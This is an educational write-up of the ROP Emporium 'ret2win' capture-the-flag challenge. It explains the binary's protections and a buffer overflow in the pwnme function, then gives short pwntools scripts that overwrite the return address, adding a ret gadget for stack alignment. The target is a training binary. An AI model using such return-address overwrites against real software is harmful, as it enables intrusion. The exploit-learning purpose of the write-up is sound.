### Intro
THIS is my first time writing a solve of pwn challenge, here in github. All this in order to learn and share at the same time. For that i started solving challenges from this website https://ropemporium.com/.
Basically this is the solve for the first challenge : **ret2win**
## First steps
we have a ret2win challenge.
![[Pasted image 20241011230907.png]]
1. So let's started by knowing more about the binary.
![[Pasted image 20241011224424.png]]
using file command we can learn about : 
- “LSB” here stands for “least-significant byte” , as opposed to “MSB”, “most-significant byte”. It means that the binary is little-endian.
- the architecture of binary which is x86-64.
- dynamically linked : meaning calls needed functions outside the binary unlike statically linked which have functions compiled inside the binary .
- libc and loader versions .
- not stripped : the binary have symbols (variables and functions names) which a good thing.
2. check protections 
![[Pasted image 20241011225950.png]]
Using `checksec` we can see that there is no canary (potential buffer overflow) , no pie (addresses are not randomized and changing with each execution) , partial relro (we can overwrite a got table entry) and NX is enabled (we cannot execute a shell in stack)
3. disassembling and decompiling with cutter
Functions are listed
![[Pasted image 20241011221716.png]]
we see main,pwnme,and ret2win functions
main calls pwnme but ret2win function is never called.

![[Pasted image 20241011221945.png]]
pwnme function reads to 0x38 bytes knwing that the buffer size is 0x20 : it is a buffer overflow.

![[Pasted image 20241011222000.png]]
ret2win is ofc our win function : it cats the flag .
now we have to overwrite the return address in order to redirect execution to ret2win function.

so we need : 
- offset to get to the ret address
- address of ret2win function

from disassembly code we see that the offset is 0x28 bytes: (0x20 bytes of the buffer + 8 bytes of rbp) 
![[Pasted image 20241011222830.png]]

and win address is 0x00400756
4. exploit 
```python3
from pwn import * 
p=process("ret2win")
p.recvuntil(b"> ")
p.sendline(b"a"*0x28+p64(0x00400756))
p.interactive()
```
by running this we get abnormal behavior...
after some research we found it is a stack misalignment:
https://masm32.com/board/index.php?topic=7729.0 cuz in pwnme function we only have a push and no pop of the rbp.

to align it we add the ret address of any ret in binary.
![[Pasted image 20241011222940.png]]

Final exploit:
```python3
from pwn import * 
p=process("ret2win")
p.recvuntil(b"> ")
p.sendline(b"a"*0x28+p64(0x00400770)+p64(0x00400756))
p.interactive()
```